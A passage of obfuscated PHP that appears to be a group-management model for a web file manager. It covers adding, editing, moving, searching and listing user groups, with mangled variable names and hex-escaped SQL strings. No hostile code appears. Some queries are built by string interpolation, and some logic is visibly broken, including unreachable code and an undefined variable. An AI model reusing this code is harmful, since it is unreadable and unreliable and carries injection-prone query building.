$ëÃñ¾òœ[2044])); } protected function getInfo($Á“ãÅÊ°, $Ö¸Ûşö = false) { $ÊÍ¸©‰Ö = $this->getInfoSimple($Á“ãÅÊ°); if (!$ÊÍ¸©‰Ö) { return !1; } if ($Ö¸Ûşö) { return $this->_listDataApplyItem($ÊÍ¸©‰Ö); } return $this->cacheFunctionGet($_SERVER[ü¢ÙÊñÛ][2045], $Á“ãÅÊ°); } protected function getInfoSimple($õß—Ã¥ç, $·ğ÷ƒş = false) { $İÕÄª¶Ï =& $_SERVER[ü¢ÙÊñÛ]; if ($·ğ÷ƒş) { $õ¤ç…®× = array($İÕÄª¶Ï[1959] => intval($õß—Ã¥ç)); $…¿ òçÒ = $this->where($õ¤ç…®×)->find(); return is_array($…¿ òçÒ) ? $…¿ òçÒ : array(); } return $this->cacheFunctionGet($İÕÄª¶Ï[2046], $õß—Ã¥ç); } protected function groupAdd($ïÇÊÇÍö) { $Â©Ñ²€¡ =& $_SERVER[ü¢ÙÊñÛ]; if (!$ïÇÊÇÍö[$Â©Ñ²€¡[203]] && isset($ïÇÊÇÍö[$Â©Ñ²€¡[1959]]) && $ïÇÊÇÍö[$Â©Ñ²€¡[1959]] == 1) { if ($šò‡ö»â = $this->getInfoSimple($ïÇÊÇÍö[$Â©Ñ²€¡[1959]], !0)) { return $ïÇÊÇÍö[$Â©Ñ²€¡[1959]]; } } else { $šò‡ö»â = $this->getInfoSimple($ïÇÊÇÍö[$Â©Ñ²€¡[203]]); if (!$šò‡ö»â) { return !1; } } $ƒ¸°±ùâ = $Â©Ñ²€¡[604]; if ($šò‡ö»â[$Â©Ñ²€¡[595]]) { $ƒ¸°±ùâ = $šò‡ö»â[$Â©Ñ²€¡[595]] . $šò‡ö»â[$Â©Ñ²€¡[1959]] . $Â©Ñ²€¡[60]; } $ÔØñ†÷ = array($Â©Ñ²€¡[505] => $this->groupNameAuto($ïÇÊÇÍö[$Â©Ñ²€¡[203]], $ïÇÊÇÍö[$Â©Ñ²€¡[42]]), $Â©Ñ²€¡[488] => $ïÇÊÇÍö[$Â©Ñ²€¡[203]], $Â©Ñ²€¡[666] => $ƒ¸°±ùâ, $Â©Ñ²€¡[2047] => $ïÇÊÇÍö[$Â©Ñ²€¡[1945]], $Â©Ñ²€¡[2048] => 0, $Â©Ñ²€¡[1963] => 0); if (isset($ïÇÊÇÍö[$Â©Ñ²€¡[1983]])) { $ÔØñ†÷[$Â©Ñ²€¡[1983]] = $ïÇÊÇÍö[$Â©Ñ²€¡[1983]]; } else { $ñ½ñŞù = $this->max($Â©Ñ²€¡[1983]); if (!$ñ½ñŞù) { $ñ½ñŞù = 0; } $ÔØñ†÷[$Â©Ñ²€¡[1983]] = $ñ½ñŞù + 1; } if (!empty($ïÇÊÇÍö[$Â©Ñ²€¡[1959]])) { $ÔØñ†÷[$Â©Ñ²€¡[1959]] = $ïÇÊÇÍö[$Â©Ñ²€¡[1959]]; } $ÖŞ¼Ç×İ = $this->add($ÔØñ†÷); $this->setNamePinyin($ÖŞ¼Ç×İ, $ÔØñ†÷[$Â©Ñ²€¡[42]]); if (isset($ïÇÊÇÍö[$Â©Ñ²€¡[2049]])) { $this->metaSet($ÖŞ¼Ç×İ, array($Â©Ñ²€¡[2049] => $ïÇÊÇÍö[$Â©Ñ²€¡[2049]], $Â©Ñ²€¡[2050] => $ïÇÊÇÍö[$Â©Ñ²€¡[2050]])); unset($ïÇÊÇÍö[$Â©Ñ²€¡[2049]]); unset($ïÇÊÇÍö[$Â©Ñ²€¡[2050]]); } Model($Â©Ñ²€¡[1410])->groupRootAdd($ÖŞ¼Ç×İ); $this->_clearCache($ïÇÊÇÍö[$Â©Ñ²€¡[203]]); return $ÖŞ¼Ç×İ; } protected function groupEdit($í¦Òõ², $˜ô¿²ü) { $ıßÉ“œ£ =& $_SERVER[ü¢ÙÊñÛ]; $ÖıŸæÓ = $this->getInfoSimple($í¦Òõ²); if (!$ÖıŸæÓ) { return !1; } if (!empty($˜ô¿²ü[$ıßÉ“œ£[203]])) { $î™×··ç = $this->getInfoSimple($˜ô¿²ü[$ıßÉ“œ£[203]]); if (!$î™×··ç) { return !1; } if ($ÖıŸæÓ[$ıßÉ“œ£[1959]] == $î™×··ç[$ıßÉ“œ£[1959]]) { return !1; } if ($˜ô¿²ü[$ıßÉ“œ£[203]] != $ÖıŸæÓ[$ıßÉ“œ£[203]]) { if ($î™×··ç[$ıßÉ“œ£[595]] !== $ÖıŸæÓ[$ıßÉ“œ£[595]] && strpos($î™×··ç[$ıßÉ“œ£[595]], $ÖıŸæÓ[$ıßÉ“œ£[595]] . $ÖıŸæÓ[$ıßÉ“œ£[1959]] . $ıßÉ“œ£[60]) === 0) { return !1; } $˜ô¿²ü[$ıßÉ“œ£[666]] = $î™×··ç[$ıßÉ“œ£[595]] . $˜ô¿²ü[$ıßÉ“œ£[203]] . $ıßÉ“œ£[60]; $this->_changeChildLevel($ÖıŸæÓ, $î™×··ç); $this->_clearCache($î™×··ç[$ıßÉ“œ£[1959]]); $this->_clearCache($ÖıŸæÓ[$ıßÉ“œ£[203]]); } } if (isset($˜ô¿²ü[$ıßÉ“œ£[42]])) { $this->setNamePinyin($í¦Òõ², $˜ô¿²ü[$ıßÉ“œ£[42]]); } if (isset($˜ô¿²ü[$ıßÉ“œ£[2049]])) { $this->metaSet($í¦Òõ², array($ıßÉ“œ£[2049] => $˜ô¿²ü[$ıßÉ“œ£[2049]], $ıßÉ“œ£[2050] => $˜ô¿²ü[$ıßÉ“œ£[2050]])); unset($˜ô¿²ü[$ıßÉ“œ£[2049]]); unset($˜ô¿²ü[$ıßÉ“œ£[2050]]); } $this->_clearChildrenCache($ÖıŸæÓ); return $this->where(array($ıßÉ“œ£[2051] => $í¦Òõ²))->save($˜ô¿²ü); } private function _clearChildrenCache($Üé©é¹Ë) { $§Ùë£ñ =& $_SERVER[ü¢ÙÊñÛ]; $¡Ú¾áæÑ = array($§Ùë£ñ[666] => array($§Ùë£ñ[626], $Üé©é¹Ë[$§Ùë£ñ[595]] . $Üé©é¹Ë[$§Ùë£ñ[1959]] . $§Ùë£ñ[627])); $ì—»½Š = $this->field($§Ùë£ñ[1959])->where($¡Ú¾áæÑ)->select(); foreach ($ì—»½Š as $Ôàóİ³) { $this->_clearCache($Ôàóİ³[$§Ùë£ñ[1959]]); } } private function _clearCache($–ÎšËÏ¿) { $‹¦ÊÊş™ =& $_SERVER[ü¢ÙÊñÛ]; $this->cacheFunctionClear($‹¦ÊÊş™[2045], $–ÎšËÏ¿); $this->cacheFunctionClear($‹¦ÊÊş™[2046], $–ÎšËÏ¿); } private function _changeChildLevel($€”Â¸ì, $¶Á‹Ó‡ø, $‰ñ©µÏË = false) { $ë³ÆŸò¥ =& $_SERVER[ü¢ÙÊñÛ]; $¶–¡İôĞ = $€”Â¸ì[$ë³ÆŸò¥[595]] . $€”Â¸ì[$ë³ÆŸò¥[1959]] . $ë³ÆŸò¥[60]; $Â÷Êêªâ = $¶Á‹Ó‡ø[$ë³ÆŸò¥[595]] . $¶Á‹Ó‡ø[$ë³ÆŸò¥[1959]] . $ë³ÆŸò¥[60] . $€”Â¸ì[$ë³ÆŸò¥[1959]] . $ë³ÆŸò¥[60]; if ($‰ñ©µÏË) { $Â÷Êêªâ = $¶Á‹Ó‡ø[$ë³ÆŸò¥[595]] . $¶Á‹Ó‡ø[$ë³ÆŸò¥[1959]] . $ë³ÆŸò¥[60]; } $êšçš°î = array($ë³ÆŸò¥[666] => array($ë³ÆŸò¥[626], $€”Â¸ì[$ë³ÆŸò¥[595]] . $€”Â¸ì[$ë³ÆŸò¥[1959]] . $ë³ÆŸò¥[627])); $œóÄ¬çõ = array($ë³ÆŸò¥[666] => array($ë³ÆŸò¥[675], "\x72\145\160\x6c\x61\x63\145\x28\160\141\x72\145\x6e\x74\x4c\x65\x76\x65\x6c\54\x27{$¶–¡İôĞ}\x27\54\47{$Â÷Êêªâ}\x27\x29")); $this->_clearChildrenCache($€”Â¸ì); $this->where($êšçš°î)->data($œóÄ¬çõ)->save(); } public function setNamePinyin($İÒòÓÑ, $Ó¸¤–•  = false) { $Æì“ÎÒà =& $_SERVER[ü¢ÙÊñÛ]; if (!$Ó¸¤–• ) { $ş‹‡¬´ = $this->getInfoSimple($İÒòÓÑ); $Ó¸¤–•  = $ş‹‡¬´[$Æì“ÎÒà[42]]; } if (!Input::check($Ó¸¤–• , $Æì“ÎÒà[669])) { $this->metaSet($İÒòÓÑ, $Æì“ÎÒà[549], null); $this->metaSet($İÒòÓÑ, $Æì“ÎÒà[548], null); return; } $°‡Ê’‚ = array($Æì“ÎÒà[549] => str_replace($Æì“ÎÒà[63], $Æì“ÎÒà[22], Pinyin::get($Ó¸¤–• )), $Æì“ÎÒà[548] => Pinyin::get($Ó¸¤–• , $Æì“ÎÒà[670])); $this->metaSet($İÒòÓÑ, $°‡Ê’‚); } protected function metaSet($´¿¾­ü, $Ş›˜—Ş­ = null, $­ĞÂ¸í = null) { $this->_clearCache($´¿¾­ü); return parent::metaSet($´¿¾­ü, $Ş›˜—Ş­, $­ĞÂ¸í); } protected function groupStatus($§çøŒ“, $şÈ±³ÇË) { $‡öˆãŞş =& $_SERVER[ü¢ÙÊñÛ]; $±çà„ò = $this->getInfoSimple($§çøŒ“); if (!$±çà„ò) { return !1; } $this->_clearCache($§çøŒ“); return $this->metaSet($§çøŒ“, $‡öˆãŞş[815], $şÈ±³ÇË); if ($şÈ±³ÇË == $‡öˆãŞş[102]) { $ğú»±ş¯ = $this->parentLevelArray($±çà„ò[$‡öˆãŞş[595]]); } else { } $ğú»±ş¯[] = $±çà„ò[$‡öˆãŞş[1959]]; $àŒÄ´ëÈ = array(); foreach ($ğú»±ş¯ as $§çøŒ“) { $àŒÄ´ëÈ[] = array($‡öˆãŞş[1959] => $§çøŒ“, $‡öˆãŞş[108] => $‡öˆãŞş[815], $‡öˆãŞş[462] => $şÈ±³ÇË); $this->_clearCache($§çøŒ“); } return Model($‡öˆãŞş[2052])->addAll($àŒÄ´ëÈ, array(), !0); } protected function groupRemove($÷³Îı¾½, $õê²¶Õ“ = false) { $øÕ˜éªƒ =& $_SERVER[ü¢ÙÊñÛ]; $ïµà›Ñ¾ = array($øÕ˜éªƒ[1959] => $÷³Îı¾½); $Å—Ä¶¼Å = $this->where($ïµà›Ñ¾)->find(); if (!$Å—Ä¶¼Å || $Å—Ä¶¼Å[$øÕ˜éªƒ[203]] == 0) { return !1; } if (!$õê²¶Õ“) { $‰Ú³¸úˆ = $this->getInfoSimple($Å—Ä¶¼Å[$øÕ˜éªƒ[203]]); $this->_changeChildLevel($Å—Ä¶¼Å, $‰Ú³¸úˆ, !0); $this->where(array($øÕ˜éªƒ[203] => $÷³Îı¾½))->save(array($øÕ˜éªƒ[203] => $Å—Ä¶¼Å[$øÕ˜éªƒ[203]])); $this->_clearCache($‰Ú³¸úˆ[$øÕ˜éªƒ[1959]]); } Model($øÕ˜éªƒ[2052])->where($ïµà›Ñ¾)->delete(); Model($øÕ˜éªƒ[2053])->where($ïµà›Ñ¾)->delete(); Model($øÕ˜éªƒ[890])->groupRootRemove($÷³Îı¾½); $this->_clearCache($Å—Ä¶¼Å[$øÕ˜éªƒ[203]]); return $this->where($ïµà›Ñ¾)->delete(); } protected function groupSort($æ»¯š¡) { $ìœ©´«½ =& $_SERVER[ü¢ÙÊñÛ]; $‚ÆĞ©Ã = array(); foreach ($æ»¯š¡ as $¡äà¨Ö¢ => $ÅíŠ¿¤) { $‚ÆĞ©Ã[] = array($ìœ©´«½[1959], $ÅíŠ¿¤, $ìœ©´«½[1983], $¡äà¨Ö¢ + 1); } $this->saveAll($‚ÆĞ©Ã); } public function listData() { $ÏäŞ²Ëı = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÏäŞ²Ëı[$_SERVER[ü¢ÙÊñÛ][457]]); return $ÏäŞ²Ëı; } private function _makeOrder($¯íˆˆïÈ = '') { $·ó½£® =& $_SERVER[ü¢ÙÊñÛ]; $Ú¿Ÿ¨«Ù = array($·ó½£®[1959], $·ó½£®[42], $·ó½£®[1947], $·ó½£®[244]); $‡”†ñÃ¾ = array($·ó½£®[534] => $·ó½£®[535], $·ó½£®[536] => $·ó½£®[537]); $ÎÄûÎ®“ = Input::get($·ó½£®[541], $·ó½£®[17], $·ó½£®[1963], $Ú¿Ÿ¨«Ù); $ö­¦ÓšÇ = Input::get($·ó½£®[542], $·ó½£®[17], $·ó½£®[2054], array($·ó½£®[2054], $·ó½£®[536])); $ö­¦ÓšÇ = $‡”†ñÃ¾[$ö­¦ÓšÇ]; $¯íˆˆïÈ = $¯íˆˆïÈ . "{$ÎÄûÎ®“}\x20{$ö­¦ÓšÇ}\x2c\40\147\162\157\165\160\x49\x44\x20\x61\x73\x63"; return $this->order($¯íˆˆïÈ); } public function listChild($¡ÏÎ˜ëÙ) { $ôÂÑ¢öí =& $_SERVER[ü¢ÙÊñÛ]; $¯‰ÑƒÌ = $this->where(array($ôÂÑ¢öí[203] => $¡ÏÎ˜ëÙ))->_makeOrder()->selectPage(200); $this->_listDataApply($¯‰ÑƒÌ[$ôÂÑ¢öí[457]]); return $¯‰ÑƒÌ; } public function listChildIds($¼ù¤ü¤î) { $õ¼‘˜¹¶ =& $_SERVER[ü¢ÙÊñÛ]; if (is_string($‚¯—Ùºü)) { $¼ù¤ü¤î = explode($õ¼‘˜¹¶[60], $¼ù¤ü¤î); } $Ûúšµí² = $this->where(array($õ¼‘˜¹¶[1959] => array($õ¼‘˜¹¶[17], $¼ù¤ü¤î)))->field($õ¼‘˜¹¶[2055])->select(); if (!$Ûúšµí²) { return !1; } $«İá³… = array(); foreach ($Ûúšµí² as $Ğö¼…À’) { $«İá³…[] = "\163\145\x6c\x65\x63\x74\40\147\162\x6f\165\160\x49\104\x20\x66\162\x6f\x6d\40\x60\x67\162\x6f\165\x70\140\x20\x77\x68\x65\x72\x65\40\x70\141\162\145\156\164\114\x65\x76\145\154\40\x6c\151\x6b\x65\40\47{$Ğö¼…À’[$õ¼‘˜¹¶[595]]}{$Ğö¼…À’[$õ¼‘˜¹¶[1959]]}\54\45\x27"; } $«İá³… = implode($õ¼‘˜¹¶[2056], $«İá³…); $Ûúšµí² = $this->query($«İá³…); if (!$Ûúšµí²) { return array(); } $¼ù¤ü¤î = array_to_keyvalue($Ûúšµí², $õ¼‘˜¹¶[22], $õ¼‘˜¹¶[1959]); return array_unique($¼ù¤ü¤î); } public function listByID($’Ú¸‰®„) { $µ¿ó©ÏÚ =& $_SERVER[ü¢ÙÊñÛ]; if (!$’Ú¸‰®„) { return array(); } $»¨’Ñ½š = array($µ¿ó©ÏÚ[1959] => array($µ¿ó©ÏÚ[17], $’Ú¸‰®„)); $õ–¬»ºÄ = $this->where($»¨’Ñ½š)->select(); $õ–¬»ºÄ = array_sort_keep($õ–¬»ºÄ, $µ¿ó©ÏÚ[1959], $’Ú¸‰®„); $this->_listDataApply($õ–¬»ºÄ); return $õ–¬»ºÄ; } public function listSearch($ÚîÙ­›’) { $©ÑµäÜ =& $_SERVER[ü¢ÙÊñÛ]; $¬©ÑÁÖ’ = trim($ÚîÙ­›’[$©ÑµäÜ[2057]]); $³ÛÛô² = explode($©ÑµäÜ[63], $¬©ÑÁÖ’); if (!$¬©ÑÁÖ’ || count($³ÛÛô²) == 1) { return $this->listSearchNow($ÚîÙ­›’); } $µ•Â¹Ø¹ = array($©ÑµäÜ[457] => array()); foreach ($³ÛÛô² as $œ‡µç½‹) { if (!trim($œ‡µç½‹)) { continue; } $ÚîÙ­›’[$©ÑµäÜ[2057]] = $œ‡µç½‹; $Šü­èåÆ = $this->listSearchNow($ÚîÙ­›’); $µ•Â¹Ø¹[$©ÑµäÜ[457]] = array_merge($µ•Â¹Ø¹[$©ÑµäÜ[457]], $Šü­èåÆ[$©ÑµäÜ[457]]); } $µ•Â¹Ø¹[$©ÑµäÜ[457]] = array_unique_by_key($µ•Â¹Ø¹[$©ÑµäÜ[457]], $©ÑµäÜ[1959]); $µ•Â¹Ø¹[$©ÑµäÜ[454]] = array($©ÑµäÜ[455] => count($µ•Â¹Ø¹[$©ÑµäÜ[457]]), $©ÑµäÜ[451] => 20, $©ÑµäÜ[440] => 1, $©ÑµäÜ[456] => 1); return $µ•Â¹Ø¹; } public function listSearchNow($–ÂÃ‡´) { $ª¤ÓèíŞ =& $_SERVER[ü¢ÙÊñÛ]; $Ä²½®Ï¥ = trim($–ÂÃ‡´[$ª¤ÓèíŞ[2057]]); $ôÇÒ’áá = isset($–ÂÃ‡´[$ª¤ÓèíŞ[2058]]) ? $–ÂÃ‡´[$ª¤ÓèíŞ[2058]] : !1; if (!trim($Ä²½®Ï¥)) { return !1; } $Ä²½®Ï¥ = str_replace($ª¤ÓèíŞ[2059], $ª¤ÓèíŞ[2060], $Ä²½®Ï¥); $¬Ü¦ËÒ¿ = array($ª¤ÓèíŞ[1959] => array($ª¤ÓèíŞ[470], "{$Ä²½®Ï¥}\45"), $ª¤ÓèíŞ[42] => array($ª¤ÓèíŞ[470], "\x25{$Ä²½®Ï¥}\45"), $ª¤ÓèíŞ[1066] => $ª¤ÓèíŞ[2061]); if ($ôÇÒ’áá) { $Á¼¨ÛµË = $this->getInfoSimple($ôÇÒ’áá); $»ü„™’ = $Á¼¨ÛµË[$ª¤ÓèíŞ[595]] . $ôÇÒ’áá . $ª¤ÓèíŞ[627]; $¬Ü¦ËÒ¿ = array($¬Ü¦ËÒ¿, array($ª¤ÓèíŞ[595] => array($ª¤ÓèíŞ[470], $»ü„™’))); } $¬Ü¦ËÒ¿ = $this->parseWhereLike($¬Ü¦ËÒ¿); $·œ¤„×À = $this->_makeOrder()->where($¬Ü¦ËÒ¿)->selectPage(20); $·œ¤„×À = $·œ¤„×À ? $·œ¤„×À : array($ª¤ÓèíŞ[457] => array(), $ª¤ÓèíŞ[454] => array()); if (!$·œ¤„×À || count($·œ¤„×À[$ª¤ÓèíŞ[457]]) < 5 && Input::check($Ä²½®Ï¥, $ª¤ÓèíŞ[405])) { $¸ªŞõÑ¢ = $this->groupChildrenAll($ôÇÒ’áá); $¸‘‰Üâû = $this->_searchFromMeta($ª¤ÓèíŞ[548], $Ä²½®Ï¥, 10, $¸ªŞõÑ¢); $è¼íø¥ = $this->_searchFromMeta($ª¤ÓèíŞ[549], $Ä²½®Ï¥, 10, $¸ªŞõÑ¢); $•Å–Äİ = array_merge($¸‘‰Üâû, $è¼íø¥, $·œ¤„×À[$ª¤ÓèíŞ[457]]); $·œ¤„×À[$ª¤ÓèíŞ[457]] = array_unique_by_key($•Å–Äİ, $ª¤ÓèíŞ[1959]); $·œ¤„×À[$ª¤ÓèíŞ[454]][$ª¤ÓèíŞ[455]] = count($·œ¤„×À[$ª¤ÓèíŞ[457]]); $·œ¤„×À[$ª¤ÓèíŞ[454]][$ª¤ÓèíŞ[456]] = ceil($·œ¤„×À[$ª¤ÓèíŞ[454]][$ª¤ÓèíŞ[455]] / $·œ¤„×À[$ª¤ÓèíŞ[454]][$ª¤ÓèíŞ[451]]); } $this->_listDataApply($·œ¤„×À[$ª¤ÓèíŞ[457]]); return $·œ¤„×À; } protected function groupChildrenAll($Ô¢Ç¦î) { $Æ¢É‡£õ =& $_SERVER[ü¢ÙÊñÛ]; if (!$Ô¢Ç¦î) { return !1; } if (!is_array($Ô¢Ç¦î)) { $Ô¢Ç¦î = array($Ô¢Ç¦î); } $½™Öèœ¶ = $Ô¢Ç¦î; foreach ($Ô¢Ç¦î as $ñœèÂ®£) { $ÍÔÓò• = $this->getInfoSimple($ñœèÂ®£); $–‹˜…Å = array($Æ¢É‡£õ[595] => array($Æ¢É‡£õ[470], $ÍÔÓò•[$Æ¢É‡£õ[595]] . $ñœèÂ®£ . $Æ¢É‡£õ[627])); $Ïà“ÓäÔ = $this->field($Æ¢É‡£õ[1959])->where($–‹˜…Å)->select(); $½™Öèœ¶ = array_merge($½™Öèœ¶, array_to_keyvalue($Ïà“ÓäÔ, $Æ¢É‡£õ[22], $Æ¢É‡£õ[1959])); } return array_unique($½™Öèœ¶); } private function _searchFromMeta($¿Õ‚Š›ø, $ÖíÏÓíÛ, $ÄïØ, $Ù©ğ½æœ) { $£ÑÄË¶Ã =& $_SERVER[ü¢ÙÊñÛ]; $ÖíÏÓíÛ = strtolower($ÖíÏÓíÛ); $Å¼ÚÇè­ = array($£ÑÄË¶Ã[108] => $¿Õ‚Š›ø, $£ÑÄË¶Ã[462] => array($£ÑÄË¶Ã[470], "\x25{$ÖíÏÓíÛ}\x25")); $Å¼ÚÇè­ = $this->parseWhereLike($Å¼ÚÇè­); if ($Ù©ğ½æœ) { $Å¼ÚÇè­[$£ÑÄË¶Ã[1959]] = array($£ÑÄË¶Ã[17], $Ù©ğ½æœ); } $€´ÖÈ¼€ = Model($£ÑÄË¶Ã[2062])->where($Å¼ÚÇè­)->limit($ÄïØ)->select(); if (!$€´ÖÈ¼€) { return array(); } $€´ÖÈ¼€ = array_to_keyvalue($€´ÖÈ¼€, $£ÑÄË¶Ã[22], $£ÑÄË¶Ã[1959]); $¥‚ÃµÇ• = $this->where(array($£ÑÄË¶Ã[2051] => array($£ÑÄË¶Ã[17], $€´ÖÈ¼€)))->select(); if (!$¥‚ÃµÇ•) { return array(); } return $¥‚ÃµÇ•; } protected function _listDataApplyItem($ùá†ïôÁ) { $Š«ÈÌô· = array($ùá†ïôÁ); $this->_listDataApply($Š«ÈÌô·); return $Š«ÈÌô·[0]; } protected function _listDataApply(&$˜ØÑÍÏ‡) { $©©›áÚ‘ =& $_SERVER[ü¢ÙÊñÛ]; if (!$˜ØÑÍÏ‡) { return; } $‡Ä™óÁÍ = array_to_keyvalue($˜ØÑÍÏ‡, $©©›áÚ‘[22], $©©›áÚ‘[1959]); $this->_listAppendChildren($˜ØÑÍÏ‡); $this->_listAppendChildrenMember($˜ØÑÍÏ‡); $this->_listAppendMeta($˜ØÑÍÏ‡, $‡Ä™óÁÍ); $this->_listAppendParent($˜ØÑÍÏ‡); $this->_listAppendSourceRoot($˜ØÑÍÏ‡, $‡Ä™óÁÍ); } private function _listAppendChildren(&$”ÉÊğ³Ş) { $¼¿’ÇÀ =& $_SERVER[ü¢ÙÊñÛ]; $ìó¼¸¿ = array_to_keyvalue($”ÉÊğ³Ş, $¼¿’ÇÀ[22], $¼¿’ÇÀ[1959]); $Øî‘–ş™ = array($¼¿’ÇÀ[203] => array($¼¿’ÇÀ[17], $ìó¼¸¿)); $¨û‰„µŞ = array($¼¿’ÇÀ[203], $¼¿’ÇÀ[2063] => $¼¿’ÇÀ[576]); $´Šó‰ˆ¤ = $this->field($¨û‰„µŞ)->where($Øî‘–ş™)->group($¼¿’ÇÀ[203])->select(); $¦äíÂü® = array_to_keyvalue($´Šó‰ˆ¤, $¼¿’ÇÀ[203], $¼¿’ÇÀ[576]); foreach ($”ÉÊğ³Ş as &$Õ¬İñ™Ì) { $ÔæìÁ„¶ = $Õ¬İñ™Ì[$¼¿’ÇÀ[1959]]; $Õ¬İñ™Ì[$¼¿’ÇÀ[2064]] = isset($¦äíÂü®[$ÔæìÁ„¶]) ? intval($¦äíÂü®[$ÔæìÁ„¶]) : !1; } unset($Õ¬İñ™Ì); } private function _listAppendChildrenMember(&$†¼£‘Îİ) { $×õ÷ü³‘ =& $_SERVER[ü¢ÙÊñÛ]; $Ë‹Šçı– = array_to_keyvalue($†¼£‘Îİ, $×õ÷ü³‘[22], $×õ÷ü³‘[1959]); $ºÒ˜˜—¨ = array($×õ÷ü³‘[1959] => array($×õ÷ü³‘[17], $Ë‹Šçı–)); $Ğ´¾‰‹· = array($×õ÷ü³‘[1959], $×õ÷ü³‘[2063] => $×õ÷ü³‘[576]); $²ÍƒĞ†” = Model($×õ÷ü³‘[2053])->field($Ğ´¾‰‹·)->where($ºÒ˜˜—¨)->group($×õ÷ü³‘[1959])->select(); $ÌäÜ¨ç = array_to_keyvalue($²ÍƒĞ†”, $×õ÷ü³‘[1959], $×õ÷ü³‘[576]); foreach ($†¼£‘Îİ as &$ÓõòğïÊ) { $Š«ÎÜÑ¬ = $ÓõòğïÊ[$×õ÷ü³‘[1959]]; $ÓõòğïÊ[$×õ÷ü³‘[2065]] = isset($ÌäÜ¨ç[$Š«ÎÜÑ¬]) ? intval($ÌäÜ¨ç[$Š«ÎÜÑ¬]) : !1; } unset($ÓõòğïÊ); } private function _listAppendMeta(&$à“ÙÔ±Ä, $ÄìØÙ) { $ş¦›Ê¬ =& $_SERVER[ü¢ÙÊñÛ]; $Ê¤¢æô = array($ş¦›Ê¬[1959] => array($ş¦›Ê¬[17], $ÄìØÙ)); $Ä¿˜ÔÃ = Model($ş¦›Ê¬[2052])->where($Ê¤¢æô)->select(); $Ä¿˜ÔÃ = array_to_keyvalue_group($Ä¿˜ÔÃ, $ş¦›Ê¬[1959]); foreach ($Ä¿˜ÔÃ as &$¡»º·¹š) { $¡»º·¹š = array_to_keyvalue($¡»º·¹š, $ş¦›Ê¬[108], $ş¦›Ê¬[462]); } unset($¡»º·¹š); foreach ($à“ÙÔ±Ä as &$¥‹Œ£Îî) { $¥‹Œ£Îî[$ş¦›Ê¬[550]] = array(); if (isset($Ä¿˜ÔÃ[$¥‹Œ£Îî[$ş¦›Ê¬[1959]]])) { $¥‹Œ£Îî[$ş¦›Ê¬[550]] = $Ä¿˜ÔÃ[$¥‹Œ£Îî[$ş¦›Ê¬[1959]]]; } } unset($¥‹Œ£Îî); } protected function parentLevelArray($ãñŠ‡À†) { $ÃâÃ¸ê§ =& $_SERVER[ü¢ÙÊñÛ]; $ãñŠ‡À† = explode($ÃâÃ¸ê§[60], trim($ãñŠ‡À†, $ÃâÃ¸ê§[60])); $ãñŠ‡À† = array_remove_value($ãñŠ‡À†, $ÃâÃ¸ê§[241]); return $ãñŠ‡À†; } protected function parentInGroup($ÁšÌ•, $‰û¾Ï¦ô) { $¡ãş­»Š =& $_SERVER[ü¢ÙÊñÛ]; $ãë¡÷¦¡ = $this->getInfoSimple($ÁšÌ•); if (!$ãë¡÷¦¡) { return !0; } $·–êÎ“€ = $this->parentLevelArray($ãë¡÷¦¡[$¡ãş­»Š[595]]); $·–êÎ“€[] = $ÁšÌ•; foreach ($·–êÎ“€ as $ÁšÌ•) { if (in_array($ÁšÌ• . $¡ãş­»Š[22], $‰û¾Ï¦ô)) { return !0; } } return !1; } private function _listAppendParent(&$áŒ¬íÄ—) { $‰Ğíì¹Ù =& $_SERVER[ü¢ÙÊñÛ]; $»³ú‰” = array(); foreach ($áŒ¬íÄ— as &$©¦§‚àâ) { $»³ú‰”[$©¦§‚àâ[$‰Ğíì¹Ù[1959]]] = $©¦§‚àâ[$‰Ğíì¹Ù[42]]; $¤ş’äè… = $this->parentLevelArray($©¦§‚àâ[$‰Ğíì¹Ù[595]]); foreach ($¤ş’äè… as $Õ½‚£ê¹) { if (!isset($»³ú‰”[$Õ½‚£ê¹])) { $»³ú‰”[$Õ½‚£ê¹] = 0; } } } unset($©¦§‚àâ); foreach ($»³ú‰” as $–ÎÙéÃ => $‘¶ŸíÔ€) { if ($‘¶ŸíÔ€) { continue; } $àó„·†û = $this->getInfoSimple($–ÎÙéÃ); $»³ú‰”[$–ÎÙéÃ] = $àó„·†û[$‰Ğíì¹Ù[42]]; } $ŒÃ‰ÄÖ§ = $GLOBALS[$‰Ğíì¹Ù[16]][$‰Ğíì¹Ù[103]][$‰Ğíì¹Ù[2066]]; if (KodUser::isRoot()) { $ŒÃ‰ÄÖ§ = !1; } foreach ($áŒ¬íÄ— as &$©¦§‚àâ) { $¤ş’äè… = $this->parentLevelArray($©¦§‚àâ[$‰Ğíì¹Ù[595]]); $¯èÌŞõú = $‰Ğíì¹Ù[22]; foreach ($¤ş’äè… as $–ÎÙéÃ => $Õ½‚£ê¹) { if ($ŒÃ‰ÄÖ§ && $–ÎÙéÃ == 0) { continue; } $¯èÌŞõú .= $»³ú‰”[$Õ½‚£ê¹] . $‰Ğíì¹Ù[18]; } if ($¤ş’äè…) { $¯èÌŞõú .= $©¦§‚àâ[$‰Ğíì¹Ù[42]]; } $©¦§‚àâ[$‰Ğíì¹Ù[600]] = str_replace($‰Ğíì¹Ù[267], $‰Ğíì¹Ù[18], $¯èÌŞõú); } unset($©¦§‚àâ); } private function _listAppendSourceRoot(&$ä¤¯ÒƒÒ, $ßŒ—¦¢œ) { $—µ–‡¬ =& $_SERVER[ü¢ÙÊñÛ]; $”ÃÜšÏô = Model($—µ–‡¬[890])->listSourceRoot(SourceModel::TYPE_GROUP, $ßŒ—¦¢œ); $”ÃÜšÏô = array_to_keyvalue($”ÃÜšÏô, $—µ–‡¬[580]); $”ÃÜšÏô = array_remove_key($”ÃÜšÏô, $—µ–‡¬[580]); foreach ($ä¤¯ÒƒÒ as &$°ñÛù¸Ë) { $°ñÛù¸Ë[$—µ–‡¬[101]] = $”ÃÜšÏô[$°ñÛù¸Ë[$—µ–‡¬[1959]]] ? $”ÃÜšÏô[$°ñÛù¸Ë[$—µ–‡¬[1959]]] : array(); } unset($°ñÛù¸Ë); } protected function groupMerge($Áó»ê°£) { $Áó»ê°£ = array_values(array_unique($Áó»ê°£)); $’ÛèÒÚ¨ = array(); for ($¦öÓœÔĞ = 0; $¦öÓœÔĞ < count($Áó»ê°£); $¦öÓœÔĞ++) { $Éİ´õå¯ = !1; for ($ëúñ‘Ôœ = 0; $ëúñ‘Ôœ < count($Áó»ê°£); $ëúñ‘Ôœ++) { if ($¦öÓœÔĞ == $ëúñ‘Ôœ) { continue; } if ($this->isParentOf($Áó»ê°£[$ëúñ‘Ôœ], $Áó»ê°£[$¦öÓœÔĞ])) { $Éİ´õå¯ = !0; break; } } if (!$Éİ´õå¯) 